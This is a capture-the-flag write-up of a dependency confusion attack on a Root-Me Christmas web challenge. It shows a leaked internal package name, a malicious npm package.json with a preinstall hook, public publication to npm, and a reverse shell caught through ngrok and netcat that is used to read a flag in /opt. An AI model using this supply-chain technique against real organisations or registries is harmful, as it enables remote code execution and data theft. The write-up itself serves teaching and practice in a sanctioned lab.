
# Confusion among the Elves
Medium web npm

Every winter, the elves’ factory relies on a massive statistics system to optimize gift production. Everything was running smoothly… until _DevSecOops_ the elf spilled his eggnog all over his laptop. Disaster: **he lost the only access to the production server**, which contains the one and only copy of Santa’s List!

From his… let’s say “foggy” memory, the file should be somewhere inside the **/opt/ directory**.

Time is running out: without the list, there’s no way to finish production before the big day.

**Your mission? Find a way to recover the list by accessing the production server!**

Save Christmas… and DevSecOops’ already fragile reputation!

_(Remember to clean up any files you create for this challenge—especially on external services—to avoid any hypothetical issues with your accounts.)_


## Solve

## dato 0a

```
http://dyn-02.xmas.root-me.org:17793/login.html


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Elf Workshop</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600&family=Bubblegum+Sans&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="styles.css">
</head>
<body class="page-login">
  <div class="container">
    <h1>🧝 Login</h1>
    <form id="loginForm">
      <div class="form-group">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <button type="submit" class="btn">Log In</button>
      <p class="error" id="error"></p>
      <p class="info">New here? Just enter your credentials to create an account.</p>
    </form>
  </div>

  <script>
    (async function checkExistingSession() {
      const response = await fetch('/api/profile', { headers: { 'Accept': 'application/json' } }).catch(() => null);
      if (!response) return;
      const contentType = response.headers.get('content-type') || '';
      if (!response.ok || !contentType.includes('application/json')) return;
      const data = await response.json().catch(() => null);
      if (data && data.username) {
        window.location.href = '/profile.html';
      }
    })();

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;
      const errorDiv = document.getElementById('error');
      
      try {
        const response = await fetch('/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });
        
        const data = await response.json();
        
        if (data.success) {
          window.location.href = data.redirect;
        } else {
          errorDiv.textContent = data.error;
          errorDiv.style.display = 'block';
        }
      } catch (error) {
        errorDiv.textContent = 'Login error';
        errorDiv.style.display = 'block';
      }
    });
  </script>
</body>
</html>

```


## dato 1a
```

http://dyn-02.xmas.root-me.org:17793/login.html


POST /api/login HTTP/1.1
Host: dyn-02.xmas.root-me.org:17793
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dyn-02.xmas.root-me.org:17793/login.html
Content-Type: application/json
Content-Length: 41
Origin: http://dyn-02.xmas.root-me.org:17793
Connection: keep-alive
Cookie: connect.sid=s%3AG3ESFV6pUAS7gAyWn222VAcaCltS-_mT.wPLbxq%2Bv5AFz3dB1NS%2BzHoINUhnW6fanUMMRqGGxw88
Priority: u=0

{"username":"carlos","password":"carlos"}


HTTP/1.1 200 OK
X-Powered-By: Express
RateLimit-Policy: 5;w=60
RateLimit-Limit: 5
RateLimit-Remaining: 4
RateLimit-Reset: 60
Content-Type: application/json; charset=utf-8
Content-Length: 43
ETag: W/"2b-awkW8kVgCAqlfjQNmTmdPWORV9Y"
Set-Cookie: connect.sid=s%3AACxRI9Abto0zFjDTeK2xMlAdj93Xk1tK.tB%2Bf3sQyfyCT8wvI9QmbGKsBA0GVk4JULhHbkQv4H3o; Path=/; Expires=Wed, 03 Dec 2025 19:54:04 GMT; HttpOnly; SameSite=Strict
Date: Wed, 03 Dec 2025 18:54:04 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"success":true,"redirect":"/profile.html"}
```



## dato 0

```html

http://dyn-02.xmas.root-me.org:17793/profile.html


<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>My Profile - Elf Workshop</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600&family=Bubblegum+Sans&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="styles.css">
</head>
<body class="page-profile">
  <div class="snow" aria-hidden="true"></div>
  <div class="header">
    <h1>Dashboard</h1>
    <div class="session-timer">
      <span class="timer-icon">🔥</span>
      <span class="timer-label">Maximum urgency: the production window closes in:</span>
      <span class="session-countdown" id="sessionCountdown">--</span>
    </div>
    <button class="logout-btn" onclick="logout()">Log Out</button>
  </div>

  <div class="dashboard">
    <div class="card">
      <h2>My Information</h2>
      <div class="elf-hero">
        <img src="images/elf.png" alt="Smiling elf" class="elf-photo">
        <p class="welcome-message">Welcome elf <span id="welcomeUsername" style="color:#f97316;">-</span>!</p>
      </div>
    </div>

    <div class="card">
      <h2>Production Statistics</h2>
      <p style="margin-bottom: 1rem; color: #4c1d95; font-size: 0.95rem;">
        * updated approximately every 2 minutes.
      </p>
      <div id="statsContent" class="loading">
        Loading statistics...
      </div>
    </div>
  </div>

  <script>
    const snowContainer = document.querySelector('.snow');
    const SNOWFLAKE_COUNT = 70;

    function createSnowflake() {
      if (!snowContainer) return;
      const snowflake = document.createElement('span');
      snowflake.className = 'snowflake';
      snowflake.textContent = Math.random() > 0.5 ? '❅' : '✻';
      const size = 0.6 + Math.random() * 0.9;
      const duration = 10 + Math.random() * 12;
      const delay = Math.random() * -20;
      const horizontalOffset = (Math.random() - 0.5) * 80;

      snowflake.style.left = `${Math.random() * 100}vw`;
      snowflake.style.fontSize = `${size}rem`;
      snowflake.style.opacity = `${0.4 + Math.random() * 0.5}`;
      snowflake.style.animationDuration = `${duration}s`;
      snowflake.style.animationDelay = `${delay}s`;
      snowflake.style.setProperty('--x-offset', `${horizontalOffset}px`);

      snowContainer.appendChild(snowflake);

      setTimeout(() => {
        snowflake.remove();
      }, (duration + Math.abs(delay)) * 1000);
    }

    if (snowContainer) {
      for (let i = 0; i < SNOWFLAKE_COUNT; i++) {
        createSnowflake();
      }
      setInterval(() => createSnowflake(), 800);
    }

    async function loadProfile() {
      const response = await fetch('/api/profile').catch(() => null);
      if (!response || !response.ok) {
        window.location.href = '/login.html';
        return;
      }
      const contentType = response.headers.get('content-type') || '';
      if (!contentType.includes('application/json')) {
        window.location.href = '/login.html';
        return;
      }
      const data = await response.json().catch(() => null);
      if (!data || !data.username) {
        window.location.href = '/login.html';
        return;
      }
      
      const usernameElement = document.getElementById('username');
      if (usernameElement) {
        usernameElement.textContent = data.username;
      }
      document.getElementById('welcomeUsername').textContent = data.username;
      if (data.csrfToken) {
        window.csrfToken = data.csrfToken;
      }

      if (data.sessionExpiresAt) {
        startCountdown(data.sessionExpiresAt);
      }

      // @ElfDev : Dont forget to remove this debug snippet after testing. (DevSecOops)
      try {
        const packageResponse = await fetch('/api/package');
        if (packageResponse.ok) {
          const packageJson = await packageResponse.json();
          console.debug('[package] package.json exposed:', packageJson);
        }
      } catch (error) {
        console.debug('[package] package.json unavailable');
      }
    }

    async function loadStats() {
      const response = await fetch('/api/stats');
      const data = await response.json();
      
      const statsDiv = document.getElementById('statsContent');
      statsDiv.textContent = '';

      if (data.status === 'building') {
        const loading = document.createElement('p');
        loading.className = 'loading';
        loading.textContent = data.message || 'Generating stats… Please wait.';
        statsDiv.appendChild(loading);
        setTimeout(loadStats, 5000);
        return;
      }

      const fields = [
        ['Gifts Wrapped', data.giftsWrapped || 0],
        ['Toys Made', data.toysMade || 0],
        ['Letters Read', data.lettersRead || 0],
        ['Efficiency', `${data.efficiency || 0}%`]
      ];

      for (const [label, value] of fields) {
        const item = document.createElement('div');
        item.className = 'stat-item';

        const name = document.createElement('span');
        name.className = 'stat-label';
        name.textContent = `${label}:`;

        const val = document.createElement('span');
        val.className = 'stat-value';
        val.textContent = value;

        item.append(name, val);
        statsDiv.appendChild(item);
      }
    }

    async function logout() {
      const headers = {};
      if (window.csrfToken) {
        headers['X-CSRF-Token'] = window.csrfToken;
      }
      await fetch('/api/logout', { method: 'POST', headers });
      window.location.href = '/login.html';
    }

    loadProfile();
    loadStats();
    setInterval(loadStats, 30000);

    const countdownElement = document.getElementById('sessionCountdown');
    function startCountdown(expirationTimestamp) {
      if (!countdownElement) return;
      const update = () => {
        const remaining = Math.max(0, expirationTimestamp - Date.now());
        const minutes = Math.floor(remaining / 60000);
        const seconds = Math.floor((remaining % 60000) / 1000);
        countdownElement.textContent = `${minutes}m ${seconds.toString().padStart(2, '0')}s`;
        if (remaining <= 0) {
          clearInterval(timer);
          countdownElement.textContent = '0m 00s';
          logout();
        }
      };
      update();
      const timer = setInterval(update, 1000);
    }
  </script>
</body>
</html>

```


## dato 1


```
/api/stats

GET /api/stats HTTP/1.1
Host: dyn-02.xmas.root-me.org:17793
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dyn-02.xmas.root-me.org:17793/profile.html
Connection: keep-alive
Cookie: connect.sid=s%3AG3ESFV6pUAS7gAyWn222VAcaCltS-_mT.wPLbxq%2Bv5AFz3dB1NS%2BzHoINUhnW6fanUMMRqGGxw88
If-None-Match: W/"6d-w14K//1h17m2mbAzk0igKOHLQss"
Priority: u=4


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 110
ETag: W/"6e-pSs6kA4t0sY5b+So+kQvYsV8+DE"
Date: Wed, 03 Dec 2025 18:49:46 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"giftsWrapped":150,"toysMade":114,"lettersRead":363,"efficiency":63,"generatedAt":"2025-12-03T18:49:09.786Z"}


```

## dato 2

```
/api/package 

GET /api/package HTTP/1.1
Host: dyn-02.xmas.root-me.org:17793
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dyn-02.xmas.root-me.org:17793/profile.html
Connection: keep-alive
Cookie: connect.sid=s%3AG3ESFV6pUAS7gAyWn222VAcaCltS-_mT.wPLbxq%2Bv5AFz3dB1NS%2BzHoINUhnW6fanUMMRqGGxw88
If-None-Match: W/"6d-w14K//1h17m2mbAzk0igKOHLQss"
Priority: u=4


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 205
ETag: W/"cd-p9dINLAiFElX6vnN8cMwpwm/jW0"
Date: Wed, 03 Dec 2025 18:50:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{
  "name": "elf-stats-nutmeg-candy-869",
  "version": "1.0.0",
  "main": "index.js",
  "description": "Package generated automatically every 2 minutes..",
  "author": "Elf Workshop",
  "license": "MIT"
}

```

## dato 3

```
GET /api/profile HTTP/1.1
Host: dyn-02.xmas.root-me.org:17793
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:145.0) Gecko/20100101 Firefox/145.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dyn-02.xmas.root-me.org:17793/profile.html
Connection: keep-alive
Cookie: connect.sid=s%3AG3ESFV6pUAS7gAyWn222VAcaCltS-_mT.wPLbxq%2Bv5AFz3dB1NS%2BzHoINUhnW6fanUMMRqGGxw88
If-None-Match: W/"6d-w14K//1h17m2mbAzk0igKOHLQss"
Priority: u=4


HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 132
ETag: W/"84-hjvaAbuXDaY4FdTNEkDRc3EaMOg"
Date: Wed, 03 Dec 2025 18:51:55 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"username":"admin","sessionExpiresAt":1764791212090,"csrfToken":"2de7264b12eb1d0fae393a95ee6d7232b462c409ed7a6d759032dc8686d64e15"}
```


## Pasos firmes

This challenge is a classic example of a **Dependency Confusion (or Supply Chain) Attack**.

The key indicators are the challenge title ("Confusion"), the fact that the server "relies on a massive statistics system" that runs automatically, and the exposure of an internal `package.json` with a specific name.

### comentarios en el codigo

```
      // @ElfDev : Dont forget to remove this debug snippet after testing. (DevSecOops)
      try {
        const packageResponse = await fetch('/api/package');
        if (packageResponse.ok) {
          const packageJson = await packageResponse.json();
          console.debug('[package] package.json exposed:', packageJson);
        }
      } catch (error) {
        console.debug('[package] package.json unavailable');
      }
    }

[package] package.json exposed:

Object { name: "elf-stats-sugarplum-stocking-422", version: "1.0.0", main: "index.js", description: "Package generated automatically every 2 minutes..", author: "Elf Workshop", license: "MIT" }

```

###




```
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 203
ETag: W/"cb-crI11Zavkvbrtwe7kAB1FQgJGtc"
Date: Wed, 03 Dec 2025 19:10:09 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{
  "name": "elf-stats-aurora-toy-659",
  "version": "1.0.0",
  "main": "index.js",
  "description": "Package generated automatically every 2 minutes..",
  "author": "Elf Workshop",
  "license": "MIT"
}

```


## Posivle Solve

```
 mkdir exploit
 ~/Downloads/tmp/root-me-25 
❯ cd exploit
 ~/Downloads/tmp/root-me-25/exploit 
❯ npm init -y
Wrote to /Users/castr/Downloads/tmp/root-me-25/exploit/package.json:

{
  "name": "exploit",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC",
  "type": "commonjs"
}
```

```
cat package.json
{
  "name": "elf-stats-nutmeg-candy-869",
  "version": "99.9.9",
  "description": "Christmas exploit",
  "main": "index.js",
  "scripts": {
    "preinstall": "node index.js"
  },
  "dependencies": {}
}
```


### npm account
```
npm login
npm notice Log in on https://registry.npmjs.org/
npm notice SECURITY NOTICE: Classic tokens expire December 9. Granular tokens now limited to 90 days with 2FA enforced by default. Update your CI/CD workflows to avoid disruption. Learn more: https://gh.io/npm-token-changes
Login at:
https://www.npmjs.com/login?next=/login/cli/***
Press ENTER to open in the browser...

Logged in on https://registry.npmjs.org/.
```

### ngrok

```
ngrok                                                                                                                                                                                                          (Ctrl+C to quit)

🧠 Call internal services from your gateway: https://ngrok.com/r/http-request

Session Status                online
Account                       Hack (Plan: Free)
Update                        update available (version 3.33.1, Ctrl-U to update)
Version                       3.33.0
Region                        United States (us)
Latency                       71ms
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://6.tcp.ngrok.io:14893 -> localhost:4444

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
                              
                              
                              
                              


 
nc -l 4444
[+] Connected to 6.tcp.ngrok.io:14893
ls
index.js
package.json
cd /opt
ls
yarn-v1.22.19
pwd
/opt
cd yarn-v1.22.19
pwd
/opt/yarn-v1.22.19
ls -la
total 32
drwxr-xr-x 4 root root 4096 Jul  4  2023 .
drwxr-xr-x 1 root root 4096 Jul  4  2023 ..
-rw-r--r-- 1 node node 1355 May 10  2022 LICENSE
-rw-r--r-- 1 node node 3353 May 10  2022 README.md
drwxr-xr-x 2 node node 4096 May 10  2022 bin
drwxr-xr-x 2 node node 4096 May 10  2022 lib
-rw-r--r-- 1 node node  634 May 10  2022 package.json
-rw-r--r-- 1 node node 2342 May 10  2022 preinstall.js


```


### publicar en npm

```
npm publish
npm notice
npm notice 📦  elf-stats-nutmeg-candy-869@99.9.9
npm notice Tarball Contents
npm notice 1.0kB index.js
npm notice 201B package.json
npm notice Tarball Details
npm notice name: elf-stats-nutmeg-candy-869
npm notice version: 99.9.9
npm notice filename: elf-stats-nutmeg-candy-869-99.9.9.tgz
npm notice package size: 805 B
npm notice unpacked size: 1.3 kB
npm notice shasum: 36082f4b14949c19213f3af3cdcfea0b8d3aa288
npm notice integrity: sha512-fva6f2XBgo8nG[...]mdXSG7Wg2Hz5Q==
npm notice total files: 2
npm notice
npm notice Publishing to https://registry.npmjs.org/ with tag latest and default access
+ elf-stats-nutmeg-candy-869@99.9.9
```


```
grep -r "RM{" /opt/ 2>/dev/null
# O busca palabras clave del reto
grep -r -i "santa" /opt/ 2>/dev/null
grep -r -i "list" /opt/ 2>/dev/null


grep -r -i "foggy" /opt/ 2>/dev/null


```

```
d /opt
ls
santa-list.txt
yarn-v1.22.22
cat santa-list.txt
RM{_D3p3nd3ncy_C0nfus10n_1s_N0t_4_G4m3_}
```